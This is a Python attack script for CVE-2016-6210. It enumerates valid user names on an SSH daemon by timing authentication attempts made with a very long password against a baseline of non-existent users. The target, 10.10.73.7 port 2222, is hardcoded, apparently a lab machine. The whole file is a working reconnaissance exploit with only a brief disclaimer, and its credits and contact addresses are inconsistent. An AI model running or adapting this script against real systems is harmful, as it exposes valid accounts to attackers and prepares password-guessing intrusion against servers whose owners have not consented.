#!/usr/bin/python
#
# CVEs:                  CVE-2016-6210 (Credits for this go to Andri Wahyudi)
#
# Author:                0_o -- null_null
#                        server.0day [at] gmail.com
#                        Oh, and it is n-u-one-one.n-u-one-one, no l's...
#                        Wonder how the guys at packet storm could get this wrong :(
# 
# Date:                  2020-08-01
# 
# Purpose:               User name enumeration against SSH daemons affected by CVE-2016-6210. 
# 
# Prerequisites:         Network access to the SSH daemon.
#
# DISCLAIMER:            Use against your own hosts only! Attacking stuff you are not 
#                        permitted to may put you in big trouble!
#
# And now - the fun part :-)
# 


import paramiko
import time
import numpy
import argparse
import sys

args = None

class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'


def get_args():
  parser = argparse.ArgumentParser()
  group = parser.add_mutually_exclusive_group()
  group.add_argument("-u", "--user", type = str, help = "Give a single user name")
  group.add_argument("-U", "--userlist", default="/usr/share/seclists/Usernames/cirt-default-usernames.txt", type = str, help = "Give a file containing a list of users")
  parser.add_argument("-e", "--enumerated", action = "store_true", help = "Only show enumerated users")
  parser.add_argument("-s", "--silent", action = "store_true", help = "Like -e, but just the user names will be written to stdout (no banner, no anything)")
  parser.add_argument("--bytes", default = 50000, type = int, help = "Send so many BYTES to the SSH daemon as a password")
  parser.add_argument("--samples", default = 12, type = int, help = "Collect so many SAMPLES to calculate a timing baseline for authenticating non-existing users")
  parser.add_argument("--factor", default = 3.0, type = float, help = "Used to compute the upper timing boundary for user enumeration")
  parser.add_argument("--trials", default = 1, type = int, help = "try to authenticate user X for TRIALS times and compare the mean of auth timings against the timing boundary")
  args = parser.parse_args()
  return args


def get_banner():
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(hostname = '10.10.73.7', port = 2222, username = 'invalidinvalidinvalid', password = 'invalidinvalidinvalid')
  except:
    banner = ssh.get_transport().remote_version
    ssh.close()
    return banner


def connect(user):
  global args
  starttime = 0.0
  endtime = 0.0
  p = 'B' * int(args.bytes)
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  starttime=time.process_time()
  try:
    ssh.connect(hostname = '10.10.73.7', port = 2222, username = user, password = p, look_for_keys = False, gss_auth = False, gss_kex = False, gss_deleg_creds = False, gss_host = None, allow_agent = False)
  except:
    endtime=time.process_time()
  finally:
    ssh.close()
    return endtime - starttime



def main():
  global args
  args = get_args()
  if not args.silent: print("\n\nUser name enumeration against SSH daemons affected by CVE-2016-6210")
  if not args.silent: print("Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari\n\n")
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing SSHD at: " + bcolors.BOLD + "10.10.73.7" + ":" + "2222" + bcolors.ENDC +  ", Banner: " + bcolors.BOLD + get_banner() + bcolors.ENDC)
  users = []
  if args.user:
    users.append(args.user)
  else:
    with open(args.userlist, "r") as f:
      users = f.readlines()
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "User list: " + bcolors.BOLD + args.userlist + bcolors.ENDC)
  # get baseline timing for non-existing users...
  baseline_samples = []
  baseline_mean = 0.0
  baseline_deviation = 0.0
  if not args.silent: sys.stdout.write(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Getting baseline timing for authenticating non-existing users")
  for i in range(1, int(args.samples) + 1):
    if not args.silent: sys.stdout.write('.')
    if not args.silent: sys.stdout.flush()
    sample = connect('foobar-bleh-nonsense' + str(i))
    baseline_samples.append(sample)
  if not args.silent: sys.stdout.write('\n')
  # remove the biggest and smallest value
  baseline_samples.sort()
  baseline_samples.pop()
  baseline_samples.reverse()
  baseline_samples.pop()
  # do math
  baseline_mean = numpy.mean(numpy.array(baseline_samples))
  baseline_deviation = numpy.std(numpy.array(baseline_samples))
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline mean for host " + '10.10.73.7' + " is " + str(baseline_mean) + " seconds.")
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline variation for host " + '10.10.73.7' + " is " + str(baseline_deviation) + " seconds.")
  upper = baseline_mean + float(args.factor) * baseline_deviation
  if not args.silent: print(bcolors.WARNING + "[*] " + bcolors.ENDC + "Defining timing of x < " + str(upper) + " as non-existing user.")
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing your users...")
  # 
  # Get timing for the given user name...
  #
  for u in users:
    user = u.strip()
    enum_samples = []
    enum_mean = 0.0
    for t in range(0, int(args.trials)):
      timeval = connect(user)
      enum_samples.append(timeval)
    enum_mean = numpy.mean(numpy.array(enum_samples))
    if (enum_mean < upper):
      if not (args.enumerated or args.silent) : 
        print(bcolors.FAIL + "[-] " + bcolors.ENDC + user + " - timing: " + str(enum_mean))
    else:
      if not args.silent: 
        print(bcolors.OKGREEN + "[+] " + bcolors.ENDC + user + " - timing: " + str(enum_mean))
      else: 
        print(user)


if __name__ == "__main__":
  main()
